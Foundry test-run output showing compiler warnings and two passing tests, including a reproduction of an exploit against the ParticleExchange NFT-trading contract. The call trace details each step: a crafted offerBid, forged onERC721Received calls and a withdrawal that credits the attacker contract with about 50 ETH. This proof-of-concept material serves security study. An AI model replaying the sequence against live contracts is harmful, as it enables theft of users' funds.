Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.21s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
   --> src/test/2024-02/ParticleTrade_exp.sol:100:5:
    |
100 |     function ownerOf(uint256 tokenId) external returns (address owner) {
    |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 303.80ms (231.09µs CPU time)

Ran 1 test for src/test/2024-02/ParticleTrade_exp.sol:ContractTest
[PASS] testExploit() (gas: 119823)
Logs:
  Attacker Eth balance before attack:: 0.000000000000000000
  Attacker Eth balance after attack:: 50.126827091960426151

Traces:
  [155044] ContractTest::testExploit()
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback{value: 79228162514264337593543950335}()
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Attacker Eth balance before attack:", val: 0, decimals: 18)
    ├─ [41031] proxy::offerBid(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0, 0)
    │   ├─ [36118] ParticleExchange::offerBid(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0, 0) [delegatecall]
    │   │   ├─ emit OfferBid(: 76, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0, : 0)
    │   │   └─ ← [Return] 76
    │   └─ ← [Return] 76
    ├─ [29922] proxy::onERC721Received(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 50126827091960426151 [5.012e19], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c2c862322e9c97d6244a3506655da95f05246fd8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29413] ParticleExchange::onERC721Received(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 50126827091960426151 [5.012e19], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c2c862322e9c97d6244a3506655da95f05246fd8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [2458] ContractTest::ownerOf(50126827091960426151 [5.012e19]) [staticcall]
    │   │   │   └─ ← [Return] proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]
    │   │   ├─ emit AcceptBid(: 76, : 0x0000000000000000000000000000000000000000, : 50126827091960426151 [5.012e19], : 0, : 1707977315 [1.707e9])
    │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3731] ContractTest::safeTransferFrom(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D], Reservoir: [0xC2c862322E9c97D6244a3506655DA95F05246Fd8], 50126827091960426151 [5.012e19], 0x3078)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [458] ContractTest::ownerOf(50126827091960426151 [5.012e19]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x150b7a02
    │   └─ ← [Return] 0x150b7a02
    ├─ [39322] proxy::onERC721Received(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 19231446 [1.923e7], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000002b7a643a825ba6ea7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065cdaa630000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c2c862322e9c97d6244a3506655da95f05246fd8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [38813] ParticleExchange::onERC721Received(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 19231446 [1.923e7], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000002b7a643a825ba6ea7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065cdaa630000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c2c862322e9c97d6244a3506655da95f05246fd8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [458] ContractTest::ownerOf(19231446 [1.923e7]) [staticcall]
    │   │   │   └─ ← [Return] proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]
    │   │   ├─ emit AcceptBid(: 76, : 0x0000000000000000000000000000000000000000, : 19231446 [1.923e7], : 0, : 1707977315 [1.707e9])
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3731] ContractTest::safeTransferFrom(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D], Reservoir: [0xC2c862322E9c97D6244a3506655DA95F05246Fd8], 19231446 [1.923e7], 0x3078)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(proxy: [0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [458] ContractTest::ownerOf(19231446 [1.923e7]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x150b7a02
    │   └─ ← [Return] 0x150b7a02
    ├─ [1022] proxy::accountBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [624] ParticleExchange::accountBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 50126827091960426151 [5.012e19]
    │   └─ ← [Return] 50126827091960426151 [5.012e19]
    ├─ [12508] proxy::withdrawAccountBalance()
    │   ├─ [12116] ParticleExchange::withdrawAccountBalance() [delegatecall]
    │   │   ├─ [55] ContractTest::receive{value: 50126827091960426151}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit WithdrawAccountBalance(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 50126827091960426151 [5.012e19])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker Eth balance after attack:", val: 50126827091960426151 [5.012e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.27s (602.13ms CPU time)

Ran 2 test suites in 1.58s (1.57s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
